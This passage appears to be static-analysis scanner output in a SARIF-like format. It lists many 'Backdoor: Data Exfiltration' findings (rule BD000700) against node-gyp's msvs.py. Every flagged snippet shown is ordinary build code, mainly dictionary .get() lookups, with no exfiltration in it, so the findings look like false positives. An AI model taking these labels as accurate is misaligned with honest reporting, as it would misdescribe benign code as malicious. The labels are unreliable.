          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1350,
                  "startColumn": 21,
                  "endLine": 1350,
                  "endColumn": 26,
                  "snippet": {
                    "text": "            suffix = \".\" + product_extension\n        elif msbuild:\n            suffix = \"$(TargetExt)\"\n        prefix = spec.get(\"product_prefix\", \"\")\n        product_name = spec.get(\"product_name\", \"$(ProjectName)\")\n        out_file = ntpath.join(out_dir, prefix + product_name + suffix)\n    return out_file, vc_tool, msbuild_tool\n",
                    "rendered": {
                      "text": "            suffix = \".\" + product_extension\n        elif msbuild:\n            suffix = \"$(TargetExt)\"\n        prefix = spec.get(\"product_prefix\", \"\")\n        product_name = spec.get(\"product_name\", \"$(ProjectName)\")\n        out_file = ntpath.join(out_dir, prefix + product_name + suffix)\n    return out_file, vc_tool, msbuild_tool\n",
                      "markdown": "`            suffix = \".\" + product_extension\n        elif msbuild:\n            suffix = \"$(TargetExt)\"\n        prefix = spec.get(\"product_prefix\", \"\")\n        product_name = spec.get(\"product_name\", \"$(ProjectName)\")\n        out_file = ntpath.join(out_dir, prefix + product_name + suffix)\n    return out_file, vc_tool, msbuild_tool\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1345,
                  "startColumn": 32,
                  "endLine": 1345,
                  "endColumn": 37,
                  "snippet": {
                    "text": "        if spec.get(\"standalone_static_library\", 0):\n            out_dir = \"$(OutDir)\"\n        out_dir = spec.get(\"product_dir\", out_dir)\n        product_extension = spec.get(\"product_extension\")\n        if product_extension:\n            suffix = \".\" + product_extension\n        elif msbuild:\n",
                    "rendered": {
                      "text": "        if spec.get(\"standalone_static_library\", 0):\n            out_dir = \"$(OutDir)\"\n        out_dir = spec.get(\"product_dir\", out_dir)\n        product_extension = spec.get(\"product_extension\")\n        if product_extension:\n            suffix = \".\" + product_extension\n        elif msbuild:\n",
                      "markdown": "`        if spec.get(\"standalone_static_library\", 0):\n            out_dir = \"$(OutDir)\"\n        out_dir = spec.get(\"product_dir\", out_dir)\n        product_extension = spec.get(\"product_extension\")\n        if product_extension:\n            suffix = \".\" + product_extension\n        elif msbuild:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1344,
                  "startColumn": 22,
                  "endLine": 1344,
                  "endColumn": 27,
                  "snippet": {
                    "text": "        vc_tool, msbuild_tool, out_dir, suffix = output_file_props\n        if spec.get(\"standalone_static_library\", 0):\n            out_dir = \"$(OutDir)\"\n        out_dir = spec.get(\"product_dir\", out_dir)\n        product_extension = spec.get(\"product_extension\")\n        if product_extension:\n            suffix = \".\" + product_extension\n",
                    "rendered": {
                      "text": "        vc_tool, msbuild_tool, out_dir, suffix = output_file_props\n        if spec.get(\"standalone_static_library\", 0):\n            out_dir = \"$(OutDir)\"\n        out_dir = spec.get(\"product_dir\", out_dir)\n        product_extension = spec.get(\"product_extension\")\n        if product_extension:\n            suffix = \".\" + product_extension\n",
                      "markdown": "`        vc_tool, msbuild_tool, out_dir, suffix = output_file_props\n        if spec.get(\"standalone_static_library\", 0):\n            out_dir = \"$(OutDir)\"\n        out_dir = spec.get(\"product_dir\", out_dir)\n        product_extension = spec.get(\"product_extension\")\n        if product_extension:\n            suffix = \".\" + product_extension\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1342,
                  "startColumn": 15,
                  "endLine": 1342,
                  "endColumn": 20,
                  "snippet": {
                    "text": "    output_file_props = output_file_map.get(spec[\"type\"])\n    if output_file_props and int(spec.get(\"msvs_auto_output_file\", 1)):\n        vc_tool, msbuild_tool, out_dir, suffix = output_file_props\n        if spec.get(\"standalone_static_library\", 0):\n            out_dir = \"$(OutDir)\"\n        out_dir = spec.get(\"product_dir\", out_dir)\n        product_extension = spec.get(\"product_extension\")\n",
                    "rendered": {
                      "text": "    output_file_props = output_file_map.get(spec[\"type\"])\n    if output_file_props and int(spec.get(\"msvs_auto_output_file\", 1)):\n        vc_tool, msbuild_tool, out_dir, suffix = output_file_props\n        if spec.get(\"standalone_static_library\", 0):\n            out_dir = \"$(OutDir)\"\n        out_dir = spec.get(\"product_dir\", out_dir)\n        product_extension = spec.get(\"product_extension\")\n",
                      "markdown": "`    output_file_props = output_file_map.get(spec[\"type\"])\n    if output_file_props and int(spec.get(\"msvs_auto_output_file\", 1)):\n        vc_tool, msbuild_tool, out_dir, suffix = output_file_props\n        if spec.get(\"standalone_static_library\", 0):\n            out_dir = \"$(OutDir)\"\n        out_dir = spec.get(\"product_dir\", out_dir)\n        product_extension = spec.get(\"product_extension\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1340,
                  "startColumn": 37,
                  "endLine": 1340,
                  "endColumn": 42,
                  "snippet": {
                    "text": "        \"static_library\": (\"VCLibrarianTool\", \"Lib\", \"$(OutDir)lib\\\\\", \".lib\"),\n    }\n    output_file_props = output_file_map.get(spec[\"type\"])\n    if output_file_props and int(spec.get(\"msvs_auto_output_file\", 1)):\n        vc_tool, msbuild_tool, out_dir, suffix = output_file_props\n        if spec.get(\"standalone_static_library\", 0):\n            out_dir = \"$(OutDir)\"\n",
                    "rendered": {
                      "text": "        \"static_library\": (\"VCLibrarianTool\", \"Lib\", \"$(OutDir)lib\\\\\", \".lib\"),\n    }\n    output_file_props = output_file_map.get(spec[\"type\"])\n    if output_file_props and int(spec.get(\"msvs_auto_output_file\", 1)):\n        vc_tool, msbuild_tool, out_dir, suffix = output_file_props\n        if spec.get(\"standalone_static_library\", 0):\n            out_dir = \"$(OutDir)\"\n",
                      "markdown": "`        \"static_library\": (\"VCLibrarianTool\", \"Lib\", \"$(OutDir)lib\\\\\", \".lib\"),\n    }\n    output_file_props = output_file_map.get(spec[\"type\"])\n    if output_file_props and int(spec.get(\"msvs_auto_output_file\", 1)):\n        vc_tool, msbuild_tool, out_dir, suffix = output_file_props\n        if spec.get(\"standalone_static_library\", 0):\n            out_dir = \"$(OutDir)\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1339,
                  "startColumn": 39,
                  "endLine": 1339,
                  "endColumn": 44,
                  "snippet": {
                    "text": "        \"windows_driver\": (\"VCLinkerTool\", \"Link\", \"$(OutDir)\", \".sys\"),\n        \"static_library\": (\"VCLibrarianTool\", \"Lib\", \"$(OutDir)lib\\\\\", \".lib\"),\n    }\n    output_file_props = output_file_map.get(spec[\"type\"])\n    if output_file_props and int(spec.get(\"msvs_auto_output_file\", 1)):\n        vc_tool, msbuild_tool, out_dir, suffix = output_file_props\n        if spec.get(\"standalone_static_library\", 0):\n",
                    "rendered": {
                      "text": "        \"windows_driver\": (\"VCLinkerTool\", \"Link\", \"$(OutDir)\", \".sys\"),\n        \"static_library\": (\"VCLibrarianTool\", \"Lib\", \"$(OutDir)lib\\\\\", \".lib\"),\n    }\n    output_file_props = output_file_map.get(spec[\"type\"])\n    if output_file_props and int(spec.get(\"msvs_auto_output_file\", 1)):\n        vc_tool, msbuild_tool, out_dir, suffix = output_file_props\n        if spec.get(\"standalone_static_library\", 0):\n",
                      "markdown": "`        \"windows_driver\": (\"VCLinkerTool\", \"Link\", \"$(OutDir)\", \".sys\"),\n        \"static_library\": (\"VCLibrarianTool\", \"Lib\", \"$(OutDir)lib\\\\\", \".lib\"),\n    }\n    output_file_props = output_file_map.get(spec[\"type\"])\n    if output_file_props and int(spec.get(\"msvs_auto_output_file\", 1)):\n        vc_tool, msbuild_tool, out_dir, suffix = output_file_props\n        if spec.get(\"standalone_static_library\", 0):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1299,
                  "startColumn": 20,
                  "endLine": 1299,
                  "endColumn": 25,
                  "snippet": {
                    "text": "  Returns:\n    The list of directory paths.\n  \"\"\"\n    libraries = spec.get(\"libraries\", [])\n    # Strip out -l, as it is not used on windows (but is needed so we can pass\n    # in libraries that are assumed to be in the default library path).\n    # Also remove duplicate entries, leaving only the last duplicate, while\n",
                    "rendered": {
                      "text": "  Returns:\n    The list of directory paths.\n  \"\"\"\n    libraries = spec.get(\"libraries\", [])\n    # Strip out -l, as it is not used on windows (but is needed so we can pass\n    # in libraries that are assumed to be in the default library path).\n    # Also remove duplicate entries, leaving only the last duplicate, while\n",
                      "markdown": "`  Returns:\n    The list of directory paths.\n  \"\"\"\n    libraries = spec.get(\"libraries\", [])\n    # Strip out -l, as it is not used on windows (but is needed so we can pass\n    # in libraries that are assumed to be in the default library path).\n    # Also remove duplicate entries, leaving only the last duplicate, while\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1286,
                  "startColumn": 25,
                  "endLine": 1286,
                  "endColumn": 30,
                  "snippet": {
                    "text": "    The list of directory paths.\n  \"\"\"\n\n    library_dirs = config.get(\"library_dirs\", [])\n    library_dirs = _FixPaths(library_dirs)\n    return library_dirs\n\n",
                    "rendered": {
                      "text": "    The list of directory paths.\n  \"\"\"\n\n    library_dirs = config.get(\"library_dirs\", [])\n    library_dirs = _FixPaths(library_dirs)\n    return library_dirs\n\n",
                      "markdown": "`    The list of directory paths.\n  \"\"\"\n\n    library_dirs = config.get(\"library_dirs\", [])\n    library_dirs = _FixPaths(library_dirs)\n    return library_dirs\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1269,
                  "startColumn": 34,
                  "endLine": 1269,
                  "endColumn": 39,
                  "snippet": {
                    "text": "    midl_include_dirs = config.get(\"midl_include_dirs\", []) + config.get(\n        \"msvs_system_include_dirs\", []\n    )\n    resource_include_dirs = config.get(\"resource_include_dirs\", include_dirs)\n    include_dirs = _FixPaths(include_dirs)\n    midl_include_dirs = _FixPaths(midl_include_dirs)\n    resource_include_dirs = _FixPaths(resource_include_dirs)\n",
                    "rendered": {
                      "text": "    midl_include_dirs = config.get(\"midl_include_dirs\", []) + config.get(\n        \"msvs_system_include_dirs\", []\n    )\n    resource_include_dirs = config.get(\"resource_include_dirs\", include_dirs)\n    include_dirs = _FixPaths(include_dirs)\n    midl_include_dirs = _FixPaths(midl_include_dirs)\n    resource_include_dirs = _FixPaths(resource_include_dirs)\n",
                      "markdown": "`    midl_include_dirs = config.get(\"midl_include_dirs\", []) + config.get(\n        \"msvs_system_include_dirs\", []\n    )\n    resource_include_dirs = config.get(\"resource_include_dirs\", include_dirs)\n    include_dirs = _FixPaths(include_dirs)\n    midl_include_dirs = _FixPaths(midl_include_dirs)\n    resource_include_dirs = _FixPaths(resource_include_dirs)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1266,
                  "startColumn": 68,
                  "endLine": 1266,
                  "endColumn": 73,
                  "snippet": {
                    "text": "    include_dirs = config.get(\"include_dirs\", []) + config.get(\n        \"msvs_system_include_dirs\", []\n    )\n    midl_include_dirs = config.get(\"midl_include_dirs\", []) + config.get(\n        \"msvs_system_include_dirs\", []\n    )\n    resource_include_dirs = config.get(\"resource_include_dirs\", include_dirs)\n",
                    "rendered": {
                      "text": "    include_dirs = config.get(\"include_dirs\", []) + config.get(\n        \"msvs_system_include_dirs\", []\n    )\n    midl_include_dirs = config.get(\"midl_include_dirs\", []) + config.get(\n        \"msvs_system_include_dirs\", []\n    )\n    resource_include_dirs = config.get(\"resource_include_dirs\", include_dirs)\n",
                      "markdown": "`    include_dirs = config.get(\"include_dirs\", []) + config.get(\n        \"msvs_system_include_dirs\", []\n    )\n    midl_include_dirs = config.get(\"midl_include_dirs\", []) + config.get(\n        \"msvs_system_include_dirs\", []\n    )\n    resource_include_dirs = config.get(\"resource_include_dirs\", include_dirs)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1266,
                  "startColumn": 30,
                  "endLine": 1266,
                  "endColumn": 35,
                  "snippet": {
                    "text": "    include_dirs = config.get(\"include_dirs\", []) + config.get(\n        \"msvs_system_include_dirs\", []\n    )\n    midl_include_dirs = config.get(\"midl_include_dirs\", []) + config.get(\n        \"msvs_system_include_dirs\", []\n    )\n    resource_include_dirs = config.get(\"resource_include_dirs\", include_dirs)\n",
                    "rendered": {
                      "text": "    include_dirs = config.get(\"include_dirs\", []) + config.get(\n        \"msvs_system_include_dirs\", []\n    )\n    midl_include_dirs = config.get(\"midl_include_dirs\", []) + config.get(\n        \"msvs_system_include_dirs\", []\n    )\n    resource_include_dirs = config.get(\"resource_include_dirs\", include_dirs)\n",
                      "markdown": "`    include_dirs = config.get(\"include_dirs\", []) + config.get(\n        \"msvs_system_include_dirs\", []\n    )\n    midl_include_dirs = config.get(\"midl_include_dirs\", []) + config.get(\n        \"msvs_system_include_dirs\", []\n    )\n    resource_include_dirs = config.get(\"resource_include_dirs\", include_dirs)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1263,
                  "startColumn": 58,
                  "endLine": 1263,
                  "endColumn": 63,
                  "snippet": {
                    "text": "  \"\"\"\n    # TODO(bradnelson): include_dirs should really be flexible enough not to\n    #                   require this sort of thing.\n    include_dirs = config.get(\"include_dirs\", []) + config.get(\n        \"msvs_system_include_dirs\", []\n    )\n    midl_include_dirs = config.get(\"midl_include_dirs\", []) + config.get(\n",
                    "rendered": {
                      "text": "  \"\"\"\n    # TODO(bradnelson): include_dirs should really be flexible enough not to\n    #                   require this sort of thing.\n    include_dirs = config.get(\"include_dirs\", []) + config.get(\n        \"msvs_system_include_dirs\", []\n    )\n    midl_include_dirs = config.get(\"midl_include_dirs\", []) + config.get(\n",
                      "markdown": "`  \"\"\"\n    # TODO(bradnelson): include_dirs should really be flexible enough not to\n    #                   require this sort of thing.\n    include_dirs = config.get(\"include_dirs\", []) + config.get(\n        \"msvs_system_include_dirs\", []\n    )\n    midl_include_dirs = config.get(\"midl_include_dirs\", []) + config.get(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1263,
                  "startColumn": 25,
                  "endLine": 1263,
                  "endColumn": 30,
                  "snippet": {
                    "text": "  \"\"\"\n    # TODO(bradnelson): include_dirs should really be flexible enough not to\n    #                   require this sort of thing.\n    include_dirs = config.get(\"include_dirs\", []) + config.get(\n        \"msvs_system_include_dirs\", []\n    )\n    midl_include_dirs = config.get(\"midl_include_dirs\", []) + config.get(\n",
                    "rendered": {
                      "text": "  \"\"\"\n    # TODO(bradnelson): include_dirs should really be flexible enough not to\n    #                   require this sort of thing.\n    include_dirs = config.get(\"include_dirs\", []) + config.get(\n        \"msvs_system_include_dirs\", []\n    )\n    midl_include_dirs = config.get(\"midl_include_dirs\", []) + config.get(\n",
                      "markdown": "`  \"\"\"\n    # TODO(bradnelson): include_dirs should really be flexible enough not to\n    #                   require this sort of thing.\n    include_dirs = config.get(\"include_dirs\", []) + config.get(\n        \"msvs_system_include_dirs\", []\n    )\n    midl_include_dirs = config.get(\"midl_include_dirs\", []) + config.get(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1192,
                  "startColumn": 26,
                  "endLine": 1192,
                  "endColumn": 31,
                  "snippet": {
                    "text": "    # Prepare the list of tools as a dictionary.\n    tools = {}\n    # Add in user specified msvs_settings.\n    msvs_settings = config.get(\"msvs_settings\", {})\n    MSVSSettings.ValidateMSVSSettings(msvs_settings)\n\n    # Prevent default library inheritance from the environment.\n",
                    "rendered": {
                      "text": "    # Prepare the list of tools as a dictionary.\n    tools = {}\n    # Add in user specified msvs_settings.\n    msvs_settings = config.get(\"msvs_settings\", {})\n    MSVSSettings.ValidateMSVSSettings(msvs_settings)\n\n    # Prevent default library inheritance from the environment.\n",
                      "markdown": "`    # Prepare the list of tools as a dictionary.\n    tools = {}\n    # Add in user specified msvs_settings.\n    msvs_settings = config.get(\"msvs_settings\", {})\n    MSVSSettings.ValidateMSVSSettings(msvs_settings)\n\n    # Prevent default library inheritance from the environment.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1187,
                  "startColumn": 31,
                  "endLine": 1187,
                  "endColumn": 36,
                  "snippet": {
                    "text": "    prebuild = config.get(\"msvs_prebuild\")\n    postbuild = config.get(\"msvs_postbuild\")\n    def_file = _GetModuleDefinition(spec)\n    precompiled_header = config.get(\"msvs_precompiled_header\")\n\n    # Prepare the list of tools as a dictionary.\n    tools = {}\n",
                    "rendered": {
                      "text": "    prebuild = config.get(\"msvs_prebuild\")\n    postbuild = config.get(\"msvs_postbuild\")\n    def_file = _GetModuleDefinition(spec)\n    precompiled_header = config.get(\"msvs_precompiled_header\")\n\n    # Prepare the list of tools as a dictionary.\n    tools = {}\n",
                      "markdown": "`    prebuild = config.get(\"msvs_prebuild\")\n    postbuild = config.get(\"msvs_postbuild\")\n    def_file = _GetModuleDefinition(spec)\n    precompiled_header = config.get(\"msvs_precompiled_header\")\n\n    # Prepare the list of tools as a dictionary.\n    tools = {}\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1185,
                  "startColumn": 22,
                  "endLine": 1185,
                  "endColumn": 27,
                  "snippet": {
                    "text": "    defines = [_EscapeCppDefineForMSVS(d) for d in defines]\n    disabled_warnings = _GetDisabledWarnings(config)\n    prebuild = config.get(\"msvs_prebuild\")\n    postbuild = config.get(\"msvs_postbuild\")\n    def_file = _GetModuleDefinition(spec)\n    precompiled_header = config.get(\"msvs_precompiled_header\")\n\n",
                    "rendered": {
                      "text": "    defines = [_EscapeCppDefineForMSVS(d) for d in defines]\n    disabled_warnings = _GetDisabledWarnings(config)\n    prebuild = config.get(\"msvs_prebuild\")\n    postbuild = config.get(\"msvs_postbuild\")\n    def_file = _GetModuleDefinition(spec)\n    precompiled_header = config.get(\"msvs_precompiled_header\")\n\n",
                      "markdown": "`    defines = [_EscapeCppDefineForMSVS(d) for d in defines]\n    disabled_warnings = _GetDisabledWarnings(config)\n    prebuild = config.get(\"msvs_prebuild\")\n    postbuild = config.get(\"msvs_postbuild\")\n    def_file = _GetModuleDefinition(spec)\n    precompiled_header = config.get(\"msvs_precompiled_header\")\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1184,
                  "startColumn": 21,
                  "endLine": 1184,
                  "endColumn": 26,
                  "snippet": {
                    "text": "    defines = _GetDefines(config)\n    defines = [_EscapeCppDefineForMSVS(d) for d in defines]\n    disabled_warnings = _GetDisabledWarnings(config)\n    prebuild = config.get(\"msvs_prebuild\")\n    postbuild = config.get(\"msvs_postbuild\")\n    def_file = _GetModuleDefinition(spec)\n    precompiled_header = config.get(\"msvs_precompiled_header\")\n",
                    "rendered": {
                      "text": "    defines = _GetDefines(config)\n    defines = [_EscapeCppDefineForMSVS(d) for d in defines]\n    disabled_warnings = _GetDisabledWarnings(config)\n    prebuild = config.get(\"msvs_prebuild\")\n    postbuild = config.get(\"msvs_postbuild\")\n    def_file = _GetModuleDefinition(spec)\n    precompiled_header = config.get(\"msvs_precompiled_header\")\n",
                      "markdown": "`    defines = _GetDefines(config)\n    defines = [_EscapeCppDefineForMSVS(d) for d in defines]\n    disabled_warnings = _GetDisabledWarnings(config)\n    prebuild = config.get(\"msvs_prebuild\")\n    postbuild = config.get(\"msvs_postbuild\")\n    def_file = _GetModuleDefinition(spec)\n    precompiled_header = config.get(\"msvs_precompiled_header\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1149,
                  "startColumn": 15,
                  "endLine": 1149,
                  "endColumn": 20,
                  "snippet": {
                    "text": "            \"none\": \"10\",  # Utility type\n        }[spec[\"type\"]]\n    except KeyError:\n        if spec.get(\"type\"):\n            raise GypError(\n                \"Target type %s is not a valid target type for \"\n                \"target %s in %s.\" % (spec[\"type\"], spec[\"target_name\"], build_file)\n",
                    "rendered": {
                      "text": "            \"none\": \"10\",  # Utility type\n        }[spec[\"type\"]]\n    except KeyError:\n        if spec.get(\"type\"):\n            raise GypError(\n                \"Target type %s is not a valid target type for \"\n                \"target %s in %s.\" % (spec[\"type\"], spec[\"target_name\"], build_file)\n",
                      "markdown": "`            \"none\": \"10\",  # Utility type\n        }[spec[\"type\"]]\n    except KeyError:\n        if spec.get(\"type\"):\n            raise GypError(\n                \"Target type %s is not a valid target type for \"\n                \"target %s in %s.\" % (spec[\"type\"], spec[\"target_name\"], build_file)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1068,
                  "startColumn": 35,
                  "endLine": 1068,
                  "endColumn": 40,
                  "snippet": {
                    "text": "    _GenerateRulesForMSVS(\n        p, project_dir, options, spec, sources, excluded_sources, actions_to_add\n    )\n    list_excluded = generator_flags.get(\"msvs_list_excluded_files\", True)\n    sources, excluded_sources, excluded_idl = _AdjustSourcesAndConvertToFilterHierarchy(\n        spec, options, project_dir, sources, excluded_sources, list_excluded, version\n    )\n",
                    "rendered": {
                      "text": "    _GenerateRulesForMSVS(\n        p, project_dir, options, spec, sources, excluded_sources, actions_to_add\n    )\n    list_excluded = generator_flags.get(\"msvs_list_excluded_files\", True)\n    sources, excluded_sources, excluded_idl = _AdjustSourcesAndConvertToFilterHierarchy(\n        spec, options, project_dir, sources, excluded_sources, list_excluded, version\n    )\n",
                      "markdown": "`    _GenerateRulesForMSVS(\n        p, project_dir, options, spec, sources, excluded_sources, actions_to_add\n    )\n    list_excluded = generator_flags.get(\"msvs_list_excluded_files\", True)\n    sources, excluded_sources, excluded_idl = _AdjustSourcesAndConvertToFilterHierarchy(\n        spec, options, project_dir, sources, excluded_sources, list_excluded, version\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
